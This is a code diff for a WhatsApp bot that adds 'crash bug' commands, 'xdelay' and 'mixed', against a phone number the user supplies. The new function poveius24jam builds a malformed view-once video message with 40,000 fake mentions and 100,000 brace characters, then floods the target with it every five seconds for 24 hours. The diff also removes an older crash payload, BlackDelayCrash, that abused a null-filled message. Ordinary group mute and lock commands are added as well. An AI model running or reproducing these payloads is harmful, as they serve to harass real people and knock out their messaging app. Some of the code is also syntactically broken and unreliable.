@@ -232,80 +232,56 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
         const isBotAdmin = groupAdmins.includes(botNumber);
 
         // Helper functions
- async function BlackDelayCrash(target, mention) {
-  let msg = await generateWAMessageFromContent(target, {
-    viewOnceMessage: {
-      message: {
-        messageContextInfo: {
-          messageSecret: crypto.randomBytes(32)
-        },
-        interactiveResponseMessage: {
-          body: {
-            text: "VIPER BUG",
-            format: "DEFAULT"
-          },
-          nativeFlowResponseMessage: {
-            name: "Viper Bug Bot",
-            paramsJson: "\u0000".repeat(999999),
-            version: 3
-          },
-          contextInfo: {
-            isForwarded: true,
-            forwardingScore: 9741,
-            forwardedNewsletterMessageInfo: {
-              newsletterName: "( @ayokunledavid )",
-              newsletterJid: "120363321780343299@newsletter",
-              serverMessageId: 1
-            }
-          }
-        }
-      }
-    }
-  }, {});
+ async function poveius24jam(conn, targetJid) {
+  const mentions = [
+    "0@s.whatsapp.net",
+    ...Array.from({ length: 40000 }, () =>
+      1${Math.floor(Math.random() * 999999)}@s.whatsapp.net
+    )
+  ];
 
-  await conn.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [target],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              { tag: "to", attrs: { jid: target }, content: undefined }
-            ]
-          }
-        ]
-      }
-    ]
-  });
+  const payload = {
+    viewOnceMessage: {
+      message: {
+        videoMessage: {
+          url: "https://mmg.whatsapp.net/d/f/Aq+PoveiusDelay.mp4?auth=1",
+          mimetype: "video/mp4",
+          caption: "Poveius",
+          fileName: "poveius_burst.mp4",
+          fileLength: "999999999",
+          seconds: "9999",
+          mediaKey: Buffer.from("dd0d5608ca9ada5538a1e1ab4ee8904823cebc3cae269b844ec6c85400c64a37", "hex"),
+          fileEncSha256: Buffer.from("83e1e439c1f43d2703655dcdcc9e80cf42a6fb80b66854dc55e1ead89fca7381", "hex"),
+          fileSha256: Buffer.from("6e993d35b1ca1c06878b8df0f206e218dbc41ac33bd6849c32c09de6cdd97e03", "hex"),
+          mediaKeyTimestamp: "999999",
+          jpegThumbnail: Buffer.alloc(0)
+        },
+        contextInfo: {
+          mentionedJid: mentions,
+          quotedMessage: {
+            extendedTextMessage: {
+              text: "\u0000",
+              contextInfo: {
+                quotedMessage: {
+                  nativeFlowMessage: {
+                    messageParamsJson: "{".repeat(100000)
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  };
 
-  if (mention) {
-    await conn.relayMessage(target, {
-      statusMentionMessage: {
-        message: {
-          protocolMessage: {
-            key: msg.key,
-            fromMe: false,
-            participant: "0@s.whatsapp.net",
-            remoteJid: "status@broadcast",
-            type: 25
-          },
-          additionalNodes: [
-            {
-              tag: "meta",
-              attrs: { is_status_mention: "VIPER X BUG" },
-              content: undefined
-            }
-          ]
-        }
-      }
-    }, {});
-  }
-  console.log("Black Owl Success Sending Delay Crash Bug");
+  const endTime = Date.now() + 24 * 60 * 60 * 1000;
+  while (Date.now() < endTime) {
+    try {
+      await conn.relayMessage(targetJid, payload, {});
+      await new Promise(r => setTimeout(r, 5000));
+    } catch (_) {}
+  }
 }
 async function xc(target) {
    
@@ -579,7 +555,27 @@ https://chat.whatsapp.com/${response}`;
                     xreply('Group name successfully updated!');
                     break;
                 }
-
+                
+                case 'mute': {
+await conn.groupSettingUpdate(chat, 'announcement')
+await xreply("Group has been muted");
+}
+break
+case 'unmute': {
+await conn.groupSettingUpdate(chat, 'not_announcement')
+await xreply("*</> Dᴏɴᴇ </>*");
+}
+break
+case 'lock': {
+await conn.groupSettingUpdate(chat, 'locked')
+await xreply("Group Editing Locked 🔒");
+}
+break
+case 'unlock': {
+await conn.groupSettingUpdate(chat, 'unlocked')
+xreply("Group Editing Unlocked 🔒");
+}
+break
                 case "desc":
                 case "setdesc": {
                     if (!isGroup) return send("This command is only for groups");
@@ -610,7 +606,6 @@ https://chat.whatsapp.com/${response}`;
                         await xc(target);
                         await xc(target);
                         await xc(target);
-                        await xiosinv(conn, target);
                         await xc(target);
                         await xc(target);
                     }
@@ -644,6 +639,54 @@ https://chat.whatsapp.com/${response}`;
                     }
                     break;
                 }
+                case "xdelay": {
+                    if (!botNumber && !isCreator) {
+                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
+                    } else {
+                    if (!q) return send("Usage: `xdelay 234xxx`");
+                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+                    try {
+                    for (let i = 0; i < 10; i++) {
+                        await poveius24jam(conn, target);
+                        await poveius24jam(conn, target);
+                        await poveius24jam(conn, target);
+                        await poveius24jam(conn, target);
+                    }
+                    xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
+                    𝗍ᥲrgᥱ𝗍: ${target}.
+                    s𝗍ᥲ𝗍ᥙs: WhatsApp user has been delayed.
+                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
+                    } catch (err) {
+                    send(`An Error Occurred: ${err}`);
+                    }
+                    }
+                    break;
+                }
+                case "mixed": {
+                    if (!botNumber && !isCreator) {
+                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
+                    } else {
+                    if (!q) return send("Usage: `xdelay 234xxx`");
+                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+                    try {
+                    for (let i = 0; i < 15; i++) {
+                        await xc(target);
+                        await xc(target);
+                        await VanitasFC(target);
+                        await VanitasFC(target);
+                        await poveius24jam(conn, target);
+                        await poveius24jam(conn, target);
+                    }
+                    xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
+                    𝗍ᥲrgᥱ𝗍: ${target}.
+                    s𝗍ᥲ𝗍ᥙs: WhatsApp user has been destroyed.
+                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
+                    } catch (err) {
+                    send(`An Error Occurred: ${err}`);
+                    }
+                    }
+                    break;
+                }
 
                 case 'menu': {
                     const image = "https://files.catbox.moe/yxnsoc.jpg";
@@ -668,6 +711,8 @@ https://chat.whatsapp.com/${response}`;
 .𝗉𝗎𝖻𝗅𝗂𝖼
 .𝗑𝗂𝗈𝗌 𝟤𝟥𝟦𝗑𝗑𝗑
 .𝗑𝖺𝗇𝖽𝗋𝗈 𝟤𝟥𝟦𝗑𝗑𝗑
+.𝗑𝖽𝖾𝗅𝖺𝗒 𝟤𝟥𝟦𝗑𝗑𝗑𝗑
+.mixed 234xxx
 
 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
 `
